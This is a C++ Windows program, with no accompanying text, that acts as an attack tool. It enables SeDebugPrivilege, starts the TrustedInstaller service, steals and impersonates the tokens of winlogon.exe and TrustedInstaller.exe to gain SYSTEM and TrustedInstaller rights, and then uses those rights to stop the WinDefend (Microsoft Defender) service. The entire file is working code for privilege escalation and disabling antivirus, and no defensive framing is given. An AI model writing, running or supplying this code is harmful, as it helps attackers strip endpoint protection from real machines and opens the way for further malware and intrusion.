#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include <cstdio>
#include <tlhelp32.h>
#include <Lmcons.h>



BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

std::string get_username()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}

BOOL StopDefenderService() {
	SERVICE_STATUS_PROCESS ssp;

	SC_HANDLE schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		printf("[-] OpenSCManager failed (%d)\n", GetLastError());
		return FALSE;
	}

	printf("[+] OpenSCManager success!\n");

	SC_HANDLE schService = OpenService(
		schSCManager,         // SCM database 
		L"WinDefend",            // name of service 
		SERVICE_STOP |
		SERVICE_QUERY_STATUS |
		SERVICE_ENUMERATE_DEPENDENTS);

	if (schService == NULL)
	{
		printf("[-] OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return FALSE;
	}
	printf("[+] OpenService success!\n");

	//Stopping service

	if (!ControlService(
		schService,
		SERVICE_CONTROL_STOP,
		(LPSERVICE_STATUS)&ssp))
	{
		printf("[-] ControlService failed (%d)\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return FALSE;
	}

}

BOOL StartTrustedInstallerService() {
	// Get a handle to the SCM database. 

	SC_HANDLE schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // servicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		printf("[-] OpenSCManager failed (%d)\n", GetLastError());
		return FALSE;
	}
	printf("[+] OpenSCManager success!\n");

	// Get a handle to the service.

	SC_HANDLE schService = OpenService(
		schSCManager,         // SCM database 
		L"TrustedInstaller",  // name of service 
		SERVICE_START);  // full access 

	if (schService == NULL)
	{
		printf("[-] OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return FALSE;
	}

	// Attempt to start the service.

	if (!StartService(
		schService,  // handle to service 
		0,           // number of arguments 
		NULL))      // no arguments 
	{
		printf("[-] StartService failed (%d)\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return FALSE;
	}

	Sleep(2000);
	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);

	return TRUE;
}

int GetProcessByName(PCWSTR name)
{
	DWORD pid = 0;

	// Create toolhelp snapshot.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	// Walkthrough all processes.
	if (Process32First(snapshot, &process))
	{
		do
		{
			// Compare process.szExeFile based on format of name, i.e., trim file path
			// trim .exe if necessary, etc.
			if (wcscmp(process.szExeFile, name) == 0)
			{
				return process.th32ProcessID;
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);

	return NULL;
}

int main(int argc, char** argv) {

	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);


	// Add SE debug privilege
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}


	// Starting TI service from SC Manager
	if (StartTrustedInstallerService())
		printf("[+] TrustedInstaller Service Started!\n");
	else {
		exit (1);
	}

	// Print whoami to compare to thread later
	printf("[+] Current user is: %s\n", (get_username()).c_str());

	// Searching for Winlogon PID 
	DWORD PID_TO_IMPERSONATE = GetProcessByName(L"winlogon.exe");

	if (PID_TO_IMPERSONATE == NULL) {
		printf("[-] Winlogon process not found\n");
		exit(1);
	}else
		printf("[+] Winlogon process found!\n");

	// Searching for TrustedInstaller PID 
	DWORD PID_TO_IMPERSONATE_TI = GetProcessByName(L"TrustedInstaller.exe");

	if (PID_TO_IMPERSONATE_TI == NULL) {
		printf("[-] TrustedInstaller process not found\n");
		exit(1);
	}
	else
		printf("[+] TrustedInstaller process found!\n");

	// Call OpenProcess() to open WINLOGON, print return code and error code
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);
	if (GetLastError() == NULL)
		printf("[+] WINLOGON OpenProcess() success!\n");
	else
	{
		printf("[-] WINLOGON OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] WINLOGON OpenProcess() Error: %i\n", GetLastError());
	}

	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	if (GetLastError() == NULL)
		printf("[+] WINLOGON OpenProcessToken() success!\n");
	else
	{
		printf("[-] WINLOGON OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] WINLOGON OpenProcessToken() Error: %i\n", GetLastError());
	}

	// Impersonate user in a thread
	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		printf("[+] WINLOGON ImpersonatedLoggedOnUser() success!\n");
		printf("[+] WINLOGON Current user is: %s\n", (get_username()).c_str());
	}
	else
	{
		printf("[-] WINLOGON ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
		printf("[-] WINLOGON ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
	}

	// Closing not necessary handles

	CloseHandle(processHandle);
	CloseHandle(tokenHandle);


	// Call OpenProcess() to open TRUSTEDINSTALLER, print return code and error code
	processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE_TI);
	if (GetLastError() == NULL)
		printf("[+] TRUSTEDINSTALLER OpenProcess() success!\n");
	else
	{
		printf("[-] TRUSTEDINSTALLER OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] TRUSTEDINSTALLER OpenProcess() Error: %i\n", GetLastError());
	}

	// Call OpenProcessToken(), print return code and error code
	getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	if (GetLastError() == NULL)
		printf("[+] TRUSTEDINSTALLER OpenProcessToken() success!\n");
	else
	{
		printf("[-] TRUSTEDINSTALLER OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] TRUSTEDINSTALLER OpenProcessToken() Error: %i\n", GetLastError());
	}

	// Impersonate user in a thread
	impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		printf("[+] TRUSTEDINSTALLER ImpersonatedLoggedOnUser() success!\n");
		printf("[+] Current user is: %s\n", (get_username()).c_str());
	}
	else
	{
		printf("[-] TRUSTEDINSTALLER ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
		printf("[-] TRUSTEDINSTALLER ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
	}


	if (StopDefenderService()) {
		printf("[+] TRUSTEDINSTALLER StopDefenderService() success!\n");
	}
	else {
		printf("[-] TRUSTEDINSTALLER StopDefenderService() Error: %i\n", GetLastError());
	}

	getchar();
	return 0;
}